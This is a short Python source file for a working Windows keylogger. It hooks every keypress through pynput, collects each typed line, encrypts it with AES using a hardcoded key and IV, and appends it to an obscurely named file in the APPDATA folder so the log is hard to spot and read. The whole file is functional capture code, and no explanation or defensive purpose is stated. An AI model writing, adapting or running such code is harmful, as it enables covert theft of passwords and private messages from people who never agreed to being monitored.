from pynput.keyboard import Listener
from Crypto.Cipher import AES
import base64, os

class Strokes(object):
    message: dict
    text: str
    counter: int

    def __init__(self) -> None:
        self.message = {}
        self.text = ''
        self.counter = 1

    def addToText(self, new_text: str) -> None:
        self.text += new_text

    def addTextToDict(self) -> None:
        self.message[self.counter] = self.text
        self.counter += 1

    def clearText(self) -> None:
        self.text = ''

    @staticmethod
    def encrypt(text: bytes) -> bytes:
        key = 'w0MrV1vBmZi1Z17v'
        iv = 'Kh54H8JTmOYq5mre'
        cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv.encode('utf-8'))
        return base64.b64encode(cipher.encrypt(text))


def keystrokes(key: str, obj: object) -> None:
    key = str(key).replace("'", '')
    obj.addToText(key)
    if key == 'Key.enter':
        obj.addTextToDict()
        open(os.getenv('APPDATA') + '/anVzdGFuW1l.txt', 'a').write(str(Strokes.encrypt(f"{str(obj.counter)}:{obj.text}".encode('utf-8'))) + '\n')
        obj.clearText()


def main() -> None:
    obj = Strokes()
    with Listener(on_press=(lambda event: keystrokes(event, obj))) as (log):
        log.join()


if __name__ == '__main__':
    main()

